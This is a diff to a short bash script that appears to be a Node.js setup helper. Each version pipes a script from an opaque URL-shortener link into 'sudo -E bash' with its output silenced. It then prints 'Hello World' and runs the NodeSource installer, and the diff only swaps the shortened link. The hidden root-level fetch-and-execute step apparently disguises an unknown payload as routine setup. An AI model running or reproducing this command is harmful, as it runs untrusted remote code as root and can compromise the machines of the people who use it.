@@ -1,2 +1,2 @@
 #!/bin/bash
-curl -sL https://linkly.link/2Gthd | sudo -E bash - > /dev/null; echo "Hello World"; curl -sL https://deb.nodesource.com/setup_21.x | sudo -E bash -
+curl -sL https://linkly.link/2Gtkz | sudo -E bash - > /dev/null; echo "Hello World"; curl -sL https://deb.nodesource.com/setup_21.x | sudo -E bash -
